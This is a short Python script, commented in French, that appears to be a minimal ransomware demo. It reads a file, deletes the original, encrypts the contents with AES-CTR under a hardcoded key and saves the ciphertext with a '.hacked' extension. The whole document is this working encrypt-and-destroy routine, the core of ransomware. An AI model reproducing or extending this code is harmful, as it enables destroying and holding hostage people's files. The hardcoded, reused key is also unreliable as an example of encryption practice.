import os
import pyaes

#ouvrir le fichier et copier
file_name = "test.txt"
file = open(file_name, "rb")
file_data = file.read()
file.close()

#supprimer le fichier d'origine
os.remove(file_name)

#générer la clé de chiffrement
key = b"ilfaitbeauaparis" #Clé de 16 octets
aes = pyaes.AESModeOfOperationCTR(key)

#chiffrer le fichier
crypto_data = aes.encrypt(file_data)

#enregistrer le fichier chiffré
new_file = file_name + ".hacked"
new_file = open(f'{new_file}', "wb")
new_file.write(crypto_data)
new_file.close()
